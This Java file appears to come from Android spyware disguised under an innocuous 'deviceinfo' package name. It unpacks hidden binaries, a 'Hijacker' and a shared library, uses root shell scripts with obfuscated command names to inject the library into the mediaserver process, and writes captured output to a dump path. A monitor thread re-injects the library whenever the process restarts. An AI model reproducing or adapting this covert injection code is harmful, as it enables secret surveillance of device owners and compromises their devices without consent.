package com.android.deviceinfo.util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import com.android.deviceinfo.Root;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.Configuration;

public class Instrument {
	private static final String TAG = "Instrument";
	private String proc;
	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
	private boolean stopMonitor = false;
	private MediaserverMonitor pidMonitor;
	private Thread monitor;

	public Instrument(String process, String dump) {
		final File filesPath = Status.getAppContext().getFilesDir();

		proc = process;

		hijacker = "m";
		lib = "n";
		path = filesPath.getAbsolutePath();
		dumpPath = dump;
		pidFile = "irg";
		pidCompletePath = path + "/" + pidFile;
	}

	public boolean installHijacker() {
		InputStream stream = Utils.getAssetStream("i.bin"); // libt.so

		try {
			// Install library
			Root.fileWrite(lib, stream, Cfg.RNDDB);
			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + path + "/" + lib);

			// copy_remount libt.so to /system/lib/
			// Execute.execute(Configuration.shellFile + " " + "fhs" + " " +
			// "/system" + " " + path + "/" + lib + " " + "/system/lib/" + lib);

			stream.close();

			// Unpack the Hijacker
			stream = Utils.getAssetStream("m.bin"); // Hijacker

			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
			Runtime.getRuntime()
					.exec(Configuration.shellFile + " " + "pzm" + " " + "750" + " " + path + "/" + hijacker);

			stream.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		// File file = new File(Status.getAppContext().getFilesDir(), lib);
		// file.delete();

		return true;
	}

	public void startInstrumentation() {
		int pid = getProcessPid();

		if (pid > 0) {
			// Run the injector
			String scriptName = "ij";
			String script = "#!/system/bin/sh\n";
			script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath;

			Root.createScript(scriptName, script);
			Execute.executeRoot(path + "/" + scriptName);
			Root.removeScript(scriptName);

			stopMonitor = false;

			pidMonitor = new MediaserverMonitor(pid);
			monitor = new Thread(pidMonitor);
			monitor.start();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getProcessPid): unable to get pid");
			}
		}
	}

	public void stopInstrumentation() {
		stopMonitor = true;
	}

	private int getProcessPid() {
		int pid;
		byte[] buf = new byte[4];

		Execute.execute(Configuration.shellFile + " " + "lid" + " " + proc + " " + pidCompletePath);

		try {
			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);

			fis.read(buf);
			fis.close();

			// Remove PID file
			File f = new File(pidCompletePath);
			f.delete();

			// Parse PID from the file
			ByteBuffer bbuf = ByteBuffer.wrap(buf);
			bbuf.order(ByteOrder.LITTLE_ENDIAN);
			pid = bbuf.getInt();
		} catch (IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return 0;
		}

		return pid;
	}

	class MediaserverMonitor implements Runnable {
		private int cur_pid, start_pid;

		public MediaserverMonitor(int p) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(MediaserverMonitor): starting");
			}

			start_pid = p;
		}

		@Override
		public void run() {
			Utils.sleep(5000);

			if (stopMonitor) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
				}

				stopMonitor = false;
				return;
			}

			cur_pid = getProcessPid();

			// Mediaserver died
			if (cur_pid != start_pid) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
				}

				startInstrumentation();
				start_pid = getProcessPid();
			}
		}
	}
}
